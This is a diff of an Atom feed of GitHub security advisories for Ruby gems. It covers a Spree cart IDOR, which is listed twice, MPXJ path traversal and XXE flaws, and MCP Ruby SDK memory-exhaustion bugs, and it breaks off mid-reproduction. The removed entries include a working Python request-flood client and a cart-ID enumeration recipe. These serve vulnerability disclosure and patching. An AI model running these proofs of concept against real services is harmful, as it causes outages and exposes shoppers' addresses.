@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/rubygems.rss</id>
     <title>Security Advisory for Ruby gems hosted at RubyGems.org</title>
-    <updated>2026-09-22T19:21:17.656Z</updated>
+    <updated>2026-09-22T22:29:33.206Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arubygems"/>
     <subtitle>Security Advisory for Ruby gems hosted at RubyGems.org on GitHub</subtitle>
@@ -11,6 +11,211 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[spree_api] Spree: Broken Access Control in `PATCH /api/v3/store/carts/:id/associate` (IDOR)]]></title>
+        <id>https://github.com/advisories/GHSA-4825-p4xm-pcf2</id>
+        <link href="https://github.com/advisories/GHSA-4825-p4xm-pcf2"/>
+        <updated>2026-09-22T20:40:32.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The Store API v3 endpoint <code>PATCH /api/v3/store/carts/:id/associate</code> binds a guest cart to the authenticated caller without verifying possession of that cart. It locates the cart by prefixed ID only — <code>current_store.carts.where(user: [nil, current_user]).find_by_prefix_id!(params[:id])</code> — and omits the <code>authorize!(:update, @cart, cart_token)</code> check that every other action in the controller performs via <code>CartResolvable</code>. Because prefixed IDs are a reversible Sqids encoding of the auto-increment primary key (obfuscation, not a token), an authenticated customer can name arbitrary guest cart IDs, take them over, and read the checkout addresses stored on them. This is broken access control / IDOR, reachable by any low-privilege registered user.</p>
+<h2 id="severity">Severity</h2>
+<p>Requires an authenticated store account and depends on target guest carts already carrying an address and not yet being associated, on a store not running in <code>login_required</code> mode. Confidentiality impact is the driver (guest checkout PII); integrity impact is limited and recoverable (cart reassignment + email overwrite on an in-progress cart). Not Critical: the action is gated behind authentication (<code>PR:L</code>, not <code>PR:N</code>) and constrained by cart state, so it is not anonymously exploitable.</p>
+<h2 id="details">Details</h2>
+<p><strong>Root cause:</strong> <code>associate</code> skips the cart-possession check its sibling actions enforce and trusts a guessable identifier as the sole locator.</p>
+<p><strong>Entry point.</strong> <code>Spree::Api::V3::Store::CartsController#associate</code> (<code>carts_controller.rb:88-96</code>), guarded only by <code>prepend_before_action :require_authentication!, only: [:index, :associate]</code>. That requires the <em>caller</em> be authenticated; it does not tie the request to a specific guest cart.</p>
+<pre><code class="language-ruby"># spree/api/app/controllers/spree/api/v3/store/carts_controller.rb:88-96
+# PATCH /api/v3/store/carts/:id/associate
+def associate
+  @cart = find_cart_for_association
+
+  result = Spree.cart_associate_service.call(guest_order: @cart, user: current_user, guest_only: true)
+
+  if result.success?
+    render_cart
+  else
+    render_service_error(result.error.to_s)
+  end
+end
+</code></pre>
+<p><strong>Missing check.</strong> <code>find_cart_for_association</code> (<code>carts_controller.rb:177-178</code>) resolves any guest cart (<code>user IS NULL</code>) in the store by ID with no <code>authorize!(..., cart_token)</code>. Contrast <code>CartResolvable#find_cart!</code>, which binds the token.</p>
+<pre><code class="language-ruby"># spree/api/app/controllers/spree/api/v3/store/carts_controller.rb:177-178
+def find_cart_for_association
+  current_store.carts.where(user: [nil, current_user]).find_by_prefix_id!(params[:id])
+end
+</code></pre>
+<p><strong>Identifier.</strong> <code>prefixed_id</code> is <code>"cart_" + SQIDS.encode([id])</code> with <code>SQIDS = Sqids.new(min_length: 10)</code> (<code>prefixed_id.rb:17,56</code>) — default alphabet, no salt, no blocklist. Sqids is non-cryptographic and reversible, so candidate IDs are derivable offline from sequential primary keys.</p>
+<pre><code class="language-ruby"># spree/core/app/models/concerns/spree/prefixed_id.rb:17-56
+SQIDS = Sqids.new(min_length: 10)
+
+def prefixed_id
+  return nil unless id.present?
+
+  "#{self.class._prefix_id_prefix}_#{Spree::PrefixedId::SQIDS.encode([id])}"
+end
+</code></pre>
+<p><strong>Data flow.</strong> <code>Spree.cart_associate_service.call(guest_order: @cart, user: current_user, guest_only: true)</code> reassigns the owner and overwrites email, preserving existing addresses via <code>bill_address ||= / ship_address ||=</code>. <code>render_cart</code> then serializes <code>billing_address</code>/<code>shipping_address</code> (first_name, last_name, address1, address2, city, postal_code, phone, company) back to the caller.</p>
+<h2 id="poc">PoC</h2>
+<p><strong>Preconditions:</strong> attacker holds an ordinary store account (self-service registration) and the store's publishable key (a front-end credential, present in any headless storefront bundle); one or more guest carts carry checkout addresses; store is not in <code>login_required</code> mode.</p>
+<ol>
+<li>Authenticate: <code>POST /api/v3/store/auth/login</code> → attacker JWT.</li>
+<li>Derive candidate IDs offline: <code>"cart_" + Sqids.encode([n])</code> for a range of <code>n</code>.</li>
+<li>For each candidate: <code>PATCH /api/v3/store/carts/&lt;id&gt;/associate</code> with the attacker JWT. A hit returns <code>200</code> with the victim's <code>billing_address</code>/<code>shipping_address</code>; non-guest or missing carts return <code>404</code>/<code>422</code>.</li>
+</ol>
+<h2 id="impact">Impact</h2>
+<p><strong>Confidentiality:</strong> an authenticated attacker can enumerate guest cart IDs and read checkout PII (name, street, postal code, phone) on carts they don't own. <strong>Integrity:</strong> limited and recoverable — each call reassigns the guest cart and overwrites its email, disrupting the original guest's in-progress cart. Requires a registered account, so not anonymously exploitable.</p>
+<h2 id="remediation">Remediation</h2>
+<p>Update to Spree 5.4.4 or 5.5.4. Your storefront, based on <a href="https://github.com/spree/storefront">https://github.com/spree/storefront</a>, doesn't need any updates because it has always sent a cart token when associating carts; this is a backend issue.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/spree/spree/security/advisories/GHSA-4825-p4xm-pcf2">https://github.com/spree/spree/security/advisories/GHSA-4825-p4xm-pcf2</a></li>
+<li><a href="https://github.com/spree/spree/pull/14314">https://github.com/spree/spree/pull/14314</a></li>
+<li><a href="https://github.com/spree/spree/commit/8834230a1f47bb5988f23f45dbd162776cf592bd">https://github.com/spree/spree/commit/8834230a1f47bb5988f23f45dbd162776cf592bd</a></li>
+<li><a href="https://github.com/spree/spree/commit/af0d1a2d582a60d179de65b7d3ea024cb26426a8">https://github.com/spree/spree/commit/af0d1a2d582a60d179de65b7d3ea024cb26426a8</a></li>
+<li><a href="https://github.com/spree/spree/releases/tag/v5.4.4">https://github.com/spree/spree/releases/tag/v5.4.4</a></li>
+<li><a href="https://github.com/spree/spree/releases/tag/v5.5.4">https://github.com/spree/spree/releases/tag/v5.5.4</a></li>
+<li><a href="https://github.com/advisories/GHSA-4825-p4xm-pcf2">https://github.com/advisories/GHSA-4825-p4xm-pcf2</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4825-p4xm-pcf2</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-22T20:40:30.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[spree_api] Spree: Broken Access Control in `PATCH /api/v3/store/carts/:id/associate` (IDOR)]]></title>
+        <id>https://github.com/advisories/GHSA-4825-p4xm-pcf2</id>
+        <link href="https://github.com/advisories/GHSA-4825-p4xm-pcf2"/>
+        <updated>2026-09-22T20:40:32.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The Store API v3 endpoint <code>PATCH /api/v3/store/carts/:id/associate</code> binds a guest cart to the authenticated caller without verifying possession of that cart. It locates the cart by prefixed ID only — <code>current_store.carts.where(user: [nil, current_user]).find_by_prefix_id!(params[:id])</code> — and omits the <code>authorize!(:update, @cart, cart_token)</code> check that every other action in the controller performs via <code>CartResolvable</code>. Because prefixed IDs are a reversible Sqids encoding of the auto-increment primary key (obfuscation, not a token), an authenticated customer can name arbitrary guest cart IDs, take them over, and read the checkout addresses stored on them. This is broken access control / IDOR, reachable by any low-privilege registered user.</p>
+<h2 id="severity">Severity</h2>
+<p>Requires an authenticated store account and depends on target guest carts already carrying an address and not yet being associated, on a store not running in <code>login_required</code> mode. Confidentiality impact is the driver (guest checkout PII); integrity impact is limited and recoverable (cart reassignment + email overwrite on an in-progress cart). Not Critical: the action is gated behind authentication (<code>PR:L</code>, not <code>PR:N</code>) and constrained by cart state, so it is not anonymously exploitable.</p>
+<h2 id="details">Details</h2>
+<p><strong>Root cause:</strong> <code>associate</code> skips the cart-possession check its sibling actions enforce and trusts a guessable identifier as the sole locator.</p>
+<p><strong>Entry point.</strong> <code>Spree::Api::V3::Store::CartsController#associate</code> (<code>carts_controller.rb:88-96</code>), guarded only by <code>prepend_before_action :require_authentication!, only: [:index, :associate]</code>. That requires the <em>caller</em> be authenticated; it does not tie the request to a specific guest cart.</p>
+<pre><code class="language-ruby"># spree/api/app/controllers/spree/api/v3/store/carts_controller.rb:88-96
+# PATCH /api/v3/store/carts/:id/associate
+def associate
+  @cart = find_cart_for_association
+
+  result = Spree.cart_associate_service.call(guest_order: @cart, user: current_user, guest_only: true)
+
+  if result.success?
+    render_cart
+  else
+    render_service_error(result.error.to_s)
+  end
+end
+</code></pre>
+<p><strong>Missing check.</strong> <code>find_cart_for_association</code> (<code>carts_controller.rb:177-178</code>) resolves any guest cart (<code>user IS NULL</code>) in the store by ID with no <code>authorize!(..., cart_token)</code>. Contrast <code>CartResolvable#find_cart!</code>, which binds the token.</p>
+<pre><code class="language-ruby"># spree/api/app/controllers/spree/api/v3/store/carts_controller.rb:177-178
+def find_cart_for_association
+  current_store.carts.where(user: [nil, current_user]).find_by_prefix_id!(params[:id])
+end
+</code></pre>
+<p><strong>Identifier.</strong> <code>prefixed_id</code> is <code>"cart_" + SQIDS.encode([id])</code> with <code>SQIDS = Sqids.new(min_length: 10)</code> (<code>prefixed_id.rb:17,56</code>) — default alphabet, no salt, no blocklist. Sqids is non-cryptographic and reversible, so candidate IDs are derivable offline from sequential primary keys.</p>
+<pre><code class="language-ruby"># spree/core/app/models/concerns/spree/prefixed_id.rb:17-56
+SQIDS = Sqids.new(min_length: 10)
+
+def prefixed_id
+  return nil unless id.present?
+
+  "#{self.class._prefix_id_prefix}_#{Spree::PrefixedId::SQIDS.encode([id])}"
+end
+</code></pre>
+<p><strong>Data flow.</strong> <code>Spree.cart_associate_service.call(guest_order: @cart, user: current_user, guest_only: true)</code> reassigns the owner and overwrites email, preserving existing addresses via <code>bill_address ||= / ship_address ||=</code>. <code>render_cart</code> then serializes <code>billing_address</code>/<code>shipping_address</code> (first_name, last_name, address1, address2, city, postal_code, phone, company) back to the caller.</p>
+<h2 id="poc">PoC</h2>
+<p><strong>Preconditions:</strong> attacker holds an ordinary store account (self-service registration) and the store's publishable key (a front-end credential, present in any headless storefront bundle); one or more guest carts carry checkout addresses; store is not in <code>login_required</code> mode.</p>
+<ol>
+<li>Authenticate: <code>POST /api/v3/store/auth/login</code> → attacker JWT.</li>
+<li>Derive candidate IDs offline: <code>"cart_" + Sqids.encode([n])</code> for a range of <code>n</code>.</li>
+<li>For each candidate: <code>PATCH /api/v3/store/carts/&lt;id&gt;/associate</code> with the attacker JWT. A hit returns <code>200</code> with the victim's <code>billing_address</code>/<code>shipping_address</code>; non-guest or missing carts return <code>404</code>/<code>422</code>.</li>
+</ol>
+<h2 id="impact">Impact</h2>
+<p><strong>Confidentiality:</strong> an authenticated attacker can enumerate guest cart IDs and read checkout PII (name, street, postal code, phone) on carts they don't own. <strong>Integrity:</strong> limited and recoverable — each call reassigns the guest cart and overwrites its email, disrupting the original guest's in-progress cart. Requires a registered account, so not anonymously exploitable.</p>
+<h2 id="remediation">Remediation</h2>
+<p>Update to Spree 5.4.4 or 5.5.4. Your storefront, based on <a href="https://github.com/spree/storefront">https://github.com/spree/storefront</a>, doesn't need any updates because it has always sent a cart token when associating carts; this is a backend issue.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/spree/spree/security/advisories/GHSA-4825-p4xm-pcf2">https://github.com/spree/spree/security/advisories/GHSA-4825-p4xm-pcf2</a></li>
+<li><a href="https://github.com/spree/spree/pull/14314">https://github.com/spree/spree/pull/14314</a></li>
+<li><a href="https://github.com/spree/spree/commit/8834230a1f47bb5988f23f45dbd162776cf592bd">https://github.com/spree/spree/commit/8834230a1f47bb5988f23f45dbd162776cf592bd</a></li>
+<li><a href="https://github.com/spree/spree/commit/af0d1a2d582a60d179de65b7d3ea024cb26426a8">https://github.com/spree/spree/commit/af0d1a2d582a60d179de65b7d3ea024cb26426a8</a></li>
+<li><a href="https://github.com/spree/spree/releases/tag/v5.4.4">https://github.com/spree/spree/releases/tag/v5.4.4</a></li>
+<li><a href="https://github.com/spree/spree/releases/tag/v5.5.4">https://github.com/spree/spree/releases/tag/v5.5.4</a></li>
+<li><a href="https://github.com/advisories/GHSA-4825-p4xm-pcf2">https://github.com/advisories/GHSA-4825-p4xm-pcf2</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4825-p4xm-pcf2</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-22T20:40:30.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[mpxj] MPXJ: Potential Path Traversal Vulnerability in Primavera P3 PRX and SureTrak STX readers]]></title>
+        <id>https://github.com/advisories/GHSA-7952-gx68-cjqr</id>
+        <link href="https://github.com/advisories/GHSA-7952-gx68-cjqr"/>
+        <updated>2026-09-22T20:34:29.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>When reading a suitably crafted PRX or STX file, MPXJ can be made to write files to arbitrary locations in the file system.</p>
+<h3 id="patches">Patches</h3>
+<p>This issue is addressed in MPXJ version 16.5.0.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>Do not read PRX or STX files from untrusted sources.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/joniles/mpxj/security/advisories/GHSA-7952-gx68-cjqr">https://github.com/joniles/mpxj/security/advisories/GHSA-7952-gx68-cjqr</a></li>
+<li><a href="https://github.com/joniles/mpxj/commit/4347315afab1ef5a2907978a754fbc5b0ff58e6f">https://github.com/joniles/mpxj/commit/4347315afab1ef5a2907978a754fbc5b0ff58e6f</a></li>
+<li><a href="https://github.com/joniles/mpxj/releases/tag/v16.5.0">https://github.com/joniles/mpxj/releases/tag/v16.5.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-7952-gx68-cjqr">https://github.com/advisories/GHSA-7952-gx68-cjqr</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7952-gx68-cjqr</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-09-22T20:34:27.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[mpxj] MPXJ: XXE Vulnerability in MerlinReader]]></title>
+        <id>https://github.com/advisories/GHSA-5vvx-3h34-f3gj</id>
+        <link href="https://github.com/advisories/GHSA-5vvx-3h34-f3gj"/>
+        <updated>2026-09-22T20:34:26.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>MPXJ used the default configuration when creating a DocumentBuilder instance, which leaves doctype declarations enabled, when parsing the XML content of the ZTIMEINTERVALS column from a Merlin project SQLite file. This would allow a carefully crafted XML payload to read an arbitrary file. However, although an arbitrary file can be read, the way the resulting parsed XML is processed by MPXJ means that the data it contains is unlikely to be available for exfiltration.</p>
+<h3 id="patches">Patches</h3>
+<p>The patch is included in MPXJ 16.4.1</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>Potential workarounds include:</p>
+<ul>
+<li>Avoid reading Merlin project files with MPXJ</li>
+<li>Only accept Merlin project files from trusted sources</li>
+<li>Preprocess Merlin SQLite databases to strip doctype declarations from the ZTIMEINTERVALS column</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/joniles/mpxj/security/advisories/GHSA-5vvx-3h34-f3gj">https://github.com/joniles/mpxj/security/advisories/GHSA-5vvx-3h34-f3gj</a></li>
+<li><a href="https://github.com/joniles/mpxj/commit/6e8288bc4d1cd62842af298004dc74fe66fb0805">https://github.com/joniles/mpxj/commit/6e8288bc4d1cd62842af298004dc74fe66fb0805</a></li>
+<li><a href="https://github.com/joniles/mpxj/releases/tag/v16.4.1">https://github.com/joniles/mpxj/releases/tag/v16.4.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-5vvx-3h34-f3gj">https://github.com/advisories/GHSA-5vvx-3h34-f3gj</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-5vvx-3h34-f3gj</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-22T20:34:25.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[decidim-elections] decidim-elections: Election question titles allow stored script execution]]></title>
         <id>https://github.com/advisories/GHSA-9mvp-w4rr-5c6x</id>
@@ -1141,451 +1346,5 @@ python3 oom_poc_client.py           # terminal B
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-07-30T14:44:06.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mcp] MCP Ruby SDK: Unbounded session retention in StreamableHTTPTransport allows memory exhaustion via initialize flood]]></title>
-        <id>https://github.com/advisories/GHSA-52jp-gj8w-j6xh</id>
-        <link href="https://github.com/advisories/GHSA-52jp-gj8w-j6xh"/>
-        <updated>2026-07-30T14:43:29.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>In its default configuration, <code>MCP::Server::Transports::StreamableHTTPTransport</code> never expires sessions. Every successful <code>initialize</code> request stores a new <code>ServerSession</code> and a session record under a fresh UUID, and the only path that removes them is an explicit client-issued HTTP <code>DELETE</code>. An unauthenticated attacker can repeatedly initialize new sessions and immediately disconnect, forcing the server to retain an unbounded number of <code>ServerSession</code> objects until memory is exhausted.</p>
-<h2 id="affected-component">Affected component</h2>
-<p><code>lib/mcp/server/transports/streamable_http_transport.rb</code>:</p>
-<ul>
-<li>Line 27, constructor: <code>def initialize(server, stateless: false, enable_json_response: false, session_idle_timeout: nil)</code> — the default for <code>session_idle_timeout</code> is <code>nil</code>.</li>
-<li>Line 46: <code>start_reaper_thread if @session_idle_timeout</code> — when the timeout is <code>nil</code>, the reaper that prunes idle sessions is never started.</li>
-<li>Lines 604–643 (<code>handle_initialization</code>): every successful <code>initialize</code> inserts a new session record; the only removal sites are <code>handle_delete</code> (client-controlled) and stream-error paths.</li>
-</ul>
-<p>The project README acknowledges the insecure default (line 1605):</p>
-<blockquote>
-<p>By default, sessions do not expire. To mitigate session hijacking risks, you can set a <code>session_idle_timeout</code> (in seconds).</p>
-</blockquote>
-<p>Per-session memory cost is non-trivial: each entry contains a <code>ServerSession</code> instance (with its own <code>Mutex</code>, <code>@in_flight</code> hash, capabilities hash, and server reference), a top-level hash entry under the session UUID, and per-pending-request <code>Queue</code> allocations.</p>
-<h2 id="proof-of-concept">Proof of concept</h2>
-<h3 id="server-session_poc_serverrb">Server (<code>session_poc_server.rb</code>)</h3>
-<p>Starts the transport in its default configuration (no <code>session_idle_timeout</code>) and reports the in-memory session count plus process RSS every two seconds.</p>
-<pre><code class="language-ruby">require "bundler/setup"
-require "mcp"
-require "mcp/server/transports/streamable_http_transport"
-require "rackup"
-require "webrick"
-require "rackup/handler/webrick"
-
-server = MCP::Server.new(name: "session-poc-target", tools: [])
-transport = MCP::Server::Transports::StreamableHTTPTransport.new(server)
-
-Thread.new do
-  loop do
-    sessions = transport.instance_variable_get(:@sessions)
-    count = sessions ? sessions.size : 0
-    rss_mb = `ps -o rss= -p #{Process.pid}`.to_i / 1024
-    STDERR.puts("[mem] sessions=#{count}  RSS=#{rss_mb} MB")
-    sleep 2
-  end
-end
-
-STDERR.puts("[poc] listening on http://127.0.0.1:9295/")
-Rackup::Handler::WEBrick.run(
-  transport,
-  Host: "127.0.0.1", Port: 9295,
-  AccessLog: [], Logger: WEBrick::Log.new(File::NULL),
-)
-</code></pre>
-<h3 id="client-session_poc_clientpy">Client (<code>session_poc_client.py</code>)</h3>
-<pre><code class="language-python">import concurrent.futures, json, socket, time
-
-HOST, PORT = "127.0.0.1", 9295
-TOTAL, WORKERS = 50_000, 32
-
-INIT = json.dumps({
-    "jsonrpc": "2.0", "id": 1, "method": "initialize",
-    "params": {"protocolVersion": "2025-11-25", "capabilities": {},
-               "clientInfo": {"name": "flooder", "version": "1.0"}}
-}).encode()
-
-REQ = (
-    f"POST / HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
-    f"Content-Type: application/json\r\n"
-    f"Accept: application/json, text/event-stream\r\n"
-    f"Content-Length: {len(INIT)}\r\nConnection: close\r\n\r\n"
-).encode() + INIT
-
-def one():
-    try:
-        s = socket.create_connection((HOST, PORT), timeout=5)
-        s.sendall(REQ)
-        data = b""
-        while True:
-            c = s.recv(8192)
-            if not c: break
-            data += c
-        s.close()
-        return b"mcp-session-id" in data.lower()
-    except OSError:
-        return False
-
-start = time.time()
-created = 0
-with concurrent.futures.ThreadPoolExecutor(max_workers=WORKERS) as ex:
-    futs = [ex.submit(one) for _ in range(TOTAL)]
-    for i, f in enumerate(concurrent.futures.as_completed(futs), 1):
-        if f.result():
-            created += 1
-        if i % 1000 == 0:
-            print(f"[poc] dispatched {i} reqs, {created} sessions confirmed, "
-                  f"elapsed {time.time() - start:.1f}s")
-
-print(f"[poc] done. {created}/{TOTAL} sessions confirmed in "
-      f"{time.time() - start:.1f}s")
-</code></pre>
-<h3 id="reproduction-commands">Reproduction commands</h3>
-<pre><code class="language-sh">bundle install
-ruby session_poc_server.rb          # terminal A
-python3 session_poc_client.py       # terminal B
-</code></pre>
-<h3 id="observed-result">Observed result</h3>
-<p>Tested on macOS, Ruby 3.2.4, against the SDK's <code>main</code> branch.</p>
-<p>Server terminal:</p>
-<pre><code>[mem] sessions=0      RSS=45  MB
-[mem] sessions=2605   RSS=56  MB
-[mem] sessions=11587  RSS=72  MB
-[mem] sessions=23119  RSS=85  MB
-[mem] sessions=34391  RSS=119 MB
-[mem] sessions=45325  RSS=128 MB
-[mem] sessions=50000  RSS=154 MB
-[mem] sessions=50000  RSS=152 MB
-[mem] sessions=50000  RSS=152 MB
-[mem] sessions=50000  RSS=152 MB     # plateau persists indefinitely
-</code></pre>
-<p>Client terminal:</p>
-<pre><code>[poc] dispatched 50000 reqs, 50000 sessions confirmed, elapsed 26.6s
-[poc] done. 50000/50000 sessions confirmed in 26.6s
-</code></pre>
-<p>50,000 unique sessions are created and retained in 26.6 seconds from a single client. The session count remains pinned at 50,000 indefinitely, confirming that no reaper exists to free the records. Scaling the attack linearly (multiple clients, larger client-capability payloads, longer runtime) drives RSS until the worker is OOM-killed.</p>
-<img width="3544" height="1674" alt="image" src="https://github.com/user-attachments/assets/89ac35ab-5629-4b48-83f8-e26a92b3e45c">
-
-<h2 id="impact">Impact</h2>
-<ul>
-<li><strong>Attacker requirements:</strong> unauthenticated TCP reach of the MCP endpoint. No session, no credentials.</li>
-<li><strong>Effect:</strong> memory-exhaustion denial of service. A sustained or distributed attacker can OOM the worker; on services that recycle workers, the attacker simply repeats. On multi-tenant gateways, one tenant can starve all others.</li>
-<li><strong>Affected deployments:</strong> every deployment that does not opt into <code>session_idle_timeout</code>. Because the README presents this as an opt-in mitigation rather than a default, real-world deployments are likely to ship vulnerable.</li>
-</ul>
-<h2 id="suggested-mitigation">Suggested mitigation</h2>
-<ol>
-<li>Change the default of <code>session_idle_timeout</code> to a finite value (e.g. 30 minutes) and document the change as a security default.</li>
-<li>Add a <code>max_sessions:</code> constructor option; reject <code>initialize</code> with HTTP 503 once the cap is reached.</li>
-<li>Track the time of the <code>initialize</code> POST separately from later request activity, and evict sessions whose GET SSE stream is never attached within N seconds.</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/security/advisories/GHSA-52jp-gj8w-j6xh">https://github.com/modelcontextprotocol/ruby-sdk/security/advisories/GHSA-52jp-gj8w-j6xh</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67430">https://nvd.nist.gov/vuln/detail/CVE-2026-67430</a></li>
-<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/commit/afb968c468c178c4d3294b423fcce250621692f4">https://github.com/modelcontextprotocol/ruby-sdk/commit/afb968c468c178c4d3294b423fcce250621692f4</a></li>
-<li><a href="https://github.com/modelcontextprotocol/ruby-sdk/releases/tag/v0.23.0">https://github.com/modelcontextprotocol/ruby-sdk/releases/tag/v0.23.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-52jp-gj8w-j6xh">https://github.com/advisories/GHSA-52jp-gj8w-j6xh</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-52jp-gj8w-j6xh</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-30T14:43:29.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mcp] MCP Ruby SDK: Unbounded line buffer in stdio transports leads to memory exhaustion (DoS)]]></title>
-        <id>https://github.com/advisories/GHSA-7683-3w9x-ch42</id>
-        <link href="https://github.com/advisories/GHSA-7683-3w9x-ch42"/>
-        <updated>2026-07-30T14:41:58.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The stdio transports in <code>MCP::Server::Transports::StdioTransport</code> and <code>MCP::Client::Stdio</code> read newline-delimited JSON-RPC frames using <code>IO#gets</code> with no <code>limit</code> argument. CRuby's <code>IO#gets</code> with no limit reads from the current position until the next separator (<code>\n</code>) with no upper bound on the returned string length. A peer that streams bytes without ever emitting a newline causes <code>gets</code> to accumulate the entire stream in a single Ruby <code>String</code> until the process is killed by the operating-system OOM killer.</p>
-<p>This is the same vulnerability class tracked in sibling MCP SDKs as GHSA-74gp-qhv5-v493 (Kotlin), GHSA-wqgc-pwpr-pq7r (TypeScript), GHSA-655q-2283-6jgj (Python), and others. It was identified during a cross-SDK audit; ruby-sdk had no prior report.</p>
-<h2 id="affected-code">Affected code</h2>
-<p>Verified at <code>main</code> @ <code>cf44475c</code>.</p>
-<h3 id="server-transport--libmcpservertransportsstdio_transportrb">Server transport — <a href="https://github.com/modelcontextprotocol/ruby-sdk/blob/cf44475c/lib/mcp/server/transports/stdio_transport.rb"><code>lib/mcp/server/transports/stdio_transport.rb</code></a></h3>
-<pre><code class="language-ruby"># line 23
-while @open &amp;&amp; (line = $stdin.gets)        # &lt;-- no limit argument
-  response = @session.handle_json(line.strip)
-  ...
-
-# line 76
-while @open &amp;&amp; (line = $stdin.gets)        # &lt;-- no limit argument
-  begin
-    parsed = JSON.parse(line.strip, symbolize_names: true)
-</code></pre>
-<p><code>$stdin</code> is the raw process global (only <code>set_encoding</code> is applied at line 16); there is no wrapper imposing a length limit.</p>
-<h3 id="client-transport--libmcpclientstdiorb">Client transport — <a href="https://github.com/modelcontextprotocol/ruby-sdk/blob/cf44475c/lib/mcp/client/stdio.rb"><code>lib/mcp/client/stdio.rb</code></a></h3>
-<pre><code class="language-ruby"># line 150
-@stdin, @stdout, @stderr, @wait_thread = Open3.popen3(spawn_env, @command, *@args)
-
-# line 228
-line = @stdout.gets                         # &lt;-- no limit argument
-raise_connection_error!(method, params) if line.nil?
-parsed = JSON.parse(line.strip)
-</code></pre>
-<p><code>@stdout</code> is the raw <code>IO</code> returned by <code>Open3.popen3</code>. The <code>@read_timeout</code> guard at line 227 (<code>wait_for_readable!</code>) only gates the <code>IO.select</code> before <code>gets</code> is invoked; once bytes are flowing, <code>gets</code> blocks indefinitely accumulating into one string.</p>
-<h2 id="impact">Impact</h2>
-<p>Denial of service via memory exhaustion. A peer that controls the byte stream delivered to the stdio transport can grow a single Ruby <code>String</code> until the process exhausts available memory.</p>
-<p><strong>Threat-model caveat (important):</strong> In the default stdio deployment, the peer process already holds local execution privileges equal to or greater than the victim:</p>
-<ul>
-<li>On the <strong>server</strong> side (<code>StdioTransport#open</code>), the writer to <code>$stdin</code> is the parent process that spawned the server, which already holds <code>Process.kill</code>, environment control, and filesystem access over the child. This direction is a robustness defect rather than a security boundary in typical deployments.</li>
-<li>On the <strong>client</strong> side (<code>Client::Stdio#read_response</code>), the writer is the third-party MCP server binary the host application chose to spawn via <code>Open3.popen3</code>. In an unsandboxed deployment that binary already has local code execution as the host user.</li>
-</ul>
-<p>This issue is primarily a security concern for:</p>
-<ul>
-<li>(a) host applications that <strong>sandbox</strong> the spawned MCP server (container, restricted user, seccomp) while piping its stdout to an unsandboxed host process — an unbounded <code>gets</code> lets a memory-capped sandboxed process exhaust the unconstrained host;</li>
-<li>(b) <strong>HTTP-to-stdio bridge</strong> deployments that forward bytes from a remote peer to a stdio server's stdin (note: surveyed bridges re-frame JSON-RPC and emit their own newlines, mitigating this in practice);</li>
-<li>(c) <strong>robustness</strong> against non-malicious servers that emit large unterminated output (misconfigured logging to stdout, runaway loops), which can crash the host process and all other MCP sessions it manages.</li>
-</ul>
-<p>The bug fires before the JSON-RPC <code>initialize</code> handshake, since <code>gets</code> cannot return until <code>\n</code> arrives.</p>
-<h2 id="reproduction">Reproduction</h2>
-<pre><code class="language-ruby"># poc_ruby_stdio_oom.rb — drives the real client transport against a producer that never emits \n
-require "mcp/client/stdio"
-
-# `yes` writes "y\n" — instead use a producer that never sends \n:
-producer = %q{ruby -e 'STDOUT.sync=true; loop { print "A" * 65536 }'}
-
-client = MCP::Client::Stdio.new(command: "bash", args: ["-c", producer])
